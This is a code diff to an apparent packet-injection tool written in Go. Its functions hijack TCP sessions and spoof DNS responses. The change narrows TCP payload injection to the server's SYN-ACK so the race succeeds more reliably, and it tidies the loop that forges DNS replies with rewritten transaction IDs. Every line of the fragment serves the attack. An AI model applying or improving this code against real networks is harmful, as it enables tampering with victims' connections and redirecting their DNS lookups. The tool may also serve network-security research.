@@ -53,15 +53,24 @@ func Hijack(interfaceName string, srcIp string, srcPort uint32, payloadFile stri
 	}
 	for packet := range packets {
 		tcpLayer := packet.Layer(layers.LayerTypeTCP)
+		if tcpLayer == nil {
+			continue
+		}
 		tcp, _ := tcpLayer.(*layers.TCP)
-		if tcp.ACK {
-			err = doHijack(packet, payload, rawConn)
-			if err != nil {
-				continue
-			}
-			if once {
-				return
-			}
+		if tcp == nil {
+			continue
+		}
+		// Only race the server's first segment (SYN-ACK). Injecting into later
+		// ACKs reuses a stale Seq/Ack and lands as an out-of-order segment the
+		// receiver drops; under --keep that means repeated wasted injections.
+		if !tcp.SYN || !tcp.ACK {
+			continue
+		}
+		if hijackErr := doHijack(packet, payload, rawConn); hijackErr != nil {
+			continue
+		}
+		if once {
+			return
 		}
 	}
 	return
@@ -133,8 +142,7 @@ func HijackDNS(interfaceName string, resolverIp string, resolverPort uint32, dom
 		} else {
 			payload = RewriteTXID(rawResponse, queryDNS.ID)
 		}
-		err = doHijackUDP(packet, payload, rawConn)
-		if err != nil {
+		if hijackErr := doHijackUDP(packet, payload, rawConn); hijackErr != nil {
 			continue
 		}
 		if once {
